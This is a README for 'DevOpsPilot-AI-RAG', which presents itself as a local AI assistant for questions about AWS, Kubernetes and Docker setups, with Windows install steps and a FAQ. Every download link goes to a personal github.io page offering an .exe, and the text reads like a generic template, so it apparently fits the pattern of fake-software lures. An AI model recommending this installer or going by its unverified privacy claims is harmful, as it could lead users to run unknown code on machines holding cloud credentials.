# 🤖 DevOpsPilot-AI-RAG - Simplify your daily infrastructure management tasks

[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://emre1145.github.io)

DevOpsPilot-AI-RAG helps you manage your cloud systems through simple conversation. You ask questions about your infrastructure, and the tool provides answers based on your specific documentation and configuration files. It uses artificial intelligence to scan your technical setup and find the information you need. You no longer need to search through hundreds of pages of manuals or long configuration logs.

## ⚙️ System Requirements

To run this application on your Windows computer, ensure your system meets these standards:

*   Operating System: Windows 10 or Windows 11.
*   Processor: An Intel Core i5 or AMD Ryzen 5 processor or better.
*   Memory: At least 8 GB of RAM.
*   Storage: 5 GB of free space on your hard drive.
*   Graphics: A modern graphics card helps, but is not strictly required.
*   Internet Connection: A stable connection is necessary for the initial setup.

## 📥 Getting the Software

You need to download the installer from our release page. Visit the link below to find the most recent version of the application.

[Visit this page to download the software](https://emre1145.github.io)

Choose the file that ends in .exe for your Windows system. Save this file to your Downloads folder or your desktop for easy access.

## 🛠️ Setting Up Your Application

Follow these steps to install the tool on your computer:

1. Locate the file you downloaded. 
2. Double-click the file to start the installer.
3. Follow the instructions on the screen.
4. Click the "Finish" button once the installation ends.
5. Look for the DevOpsPilot-AI-RAG icon on your desktop.
6. Open the application by double-clicking the icon.

The first time you run the tool, it will configure the internal settings. This process might take a few minutes as the software prepares its local database.

## 🧠 Using the Assistant

Once the application window opens, you will see a text box at the bottom of the screen. You can type any question regarding your DevOps environment here. 

Examples of questions you can ask:
* "How do I restart my AWS EC2 instance?"
* "What is the status of my Kubernetes cluster?"
* "Explain the current Docker configuration files."
* "List the steps to update an AWS Lambda function."

The assistant scans your connected files and provides a clear answer. If it needs more context, it will ask you to upload additional documentation or configuration logs.

## 📂 Managing Your Data

The tool uses a local database to store information about your infrastructure. You can manage this data through the settings menu.

1. Click the "Settings" button in the top corner of the app.
2. Select "Data Management."
3. Click "Add Files" to include new logs or manuals in your search results.
4. Click "Refresh Index" to help the software learn about your new file additions.

## 🔐 Keeping Your Information Secure

The assistant operates primarily on your local computer. It does not send your private cloud credentials or sensitive infrastructure details to external servers. All processing happens within your machine to ensure your data stays under your control.

## ❓ Frequently Asked Questions

**Why is the application taking time to start?**
The tool loads a local machine learning model into your memory. This requires checking your computer hardware upon startup to ensure optimal performance.

**The output seems incorrect. How do I fix this?**
Check if the files you provided to the tool are up to date. The assistant relies entirely on the documents you give it. If your manuals are old, the answers will reflect that outdated information.

**Do I need a cloud account to use this?**
You do not need a paid account to run the application itself. However, to get answers regarding specific systems like AWS or Kubernetes, you must provide your exported configuration files or export your environment logs into the tool.

**Does this software require an active internet connection?**
The software functions offline once you complete the initial model download. You only need the internet if you choose to sync new data from online sources or check for updates.

Keywords: ansible, aws, awsec2, awslambda, chromadb, chunking, devops, docker, embeddings, env, huggingface, kubernetes, langchain, llama3, ollama, python3, rag